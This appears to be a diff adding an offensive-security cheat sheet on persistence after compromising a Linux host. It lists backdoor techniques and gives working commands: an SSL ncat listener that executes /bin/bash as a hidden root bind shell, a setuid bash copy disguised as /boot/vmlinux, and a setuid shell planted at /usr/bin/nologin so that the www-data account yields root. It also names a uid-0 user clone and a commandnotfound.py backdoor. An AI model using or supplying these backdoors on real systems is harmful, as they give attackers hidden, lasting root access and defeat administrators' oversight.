@@ -1,0 +1,29 @@
+== Persistence
+
+* clone uid 0 user
+* "commandnotfound.py" backdoor
+* hidden encrypted ncat tunnel as root
+----
+# server
+ncat --exec "/bin/bash" -l 7777 --keep-open --ssl
+# client
+ncat localhost 7777 --ssl
+----
+* meterpreter w/ socat tunnel
+* hidden setuid bash (w/o -p bash drops the privileges)
+----
+cp /bin/bash /boot/vmlinux
+chmod u+s /boot/vmlinux
+$ /boot/vmlinux -p
+----
+
+=== Hiding in plain sight
+
+* setuid shell in `/usr/bin/nologin`
+* change www-data from `/usr/sbin/nologin` to `/usr/bin/nologin`
+* after login: `/usr/bin/nologin -p`
+* root shell!
+
+=== References
+
+* http://unix.stackexchange.com/questions/364/allow-setuid-on-shell-scripts/2910#2910
